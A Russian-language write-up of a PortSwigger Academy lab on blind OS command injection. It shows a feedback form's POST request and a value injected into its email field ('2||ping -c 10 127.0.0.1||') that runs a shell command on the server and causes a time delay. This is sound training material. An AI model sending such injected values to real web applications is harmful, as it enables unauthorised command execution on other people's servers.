По заданию известно, что уязвимость содержится на странице обратной связи, зайдем и поймем, какой запрос к веб-серверу она выполняет
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/2.%20Blind%20OS%20command%20injection%20with%20time%20delays/pics%20for%20walktrough/1.png)
Получаем запрос следующего вида (прошу прощения за отсутсвие скрина)
```
POST /feedback/submit
...
srf=GwySmnt57CrVics3M4lDx3qhfFLk7nYl&name=1&email=2@2&subject=3&message=4
```

Последовательно перебираем параметры, которые могут быть уязвимы, и находим, что параметр emaei является уязвимым. Впишем в него команду, которая имеет параметр запуска через определенное время, и установим данный параметр в 10 секунд - `email=2||ping+-c+10+127.0.0.1||`  - не забываем про URL кодировку!
Соответсвенно, наш запрос будет иметь вид
```
POST /feedback/submit
...
csrf=GwySmnt57CrVics3M4lDx3qhfFLk7nYl&name=1&email=2||ping+-c+10+127.0.0.1||&subject=3&message=4
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/4.%20OS%20command%20injection/2.%20Blind%20OS%20command%20injection%20with%20time%20delays/pics%20for%20walktrough/3.png)
Поздравляю! Лабораторная работа выполнена и мы успешно выполнили команду на сервере с отложенным запуском через веб-приложение
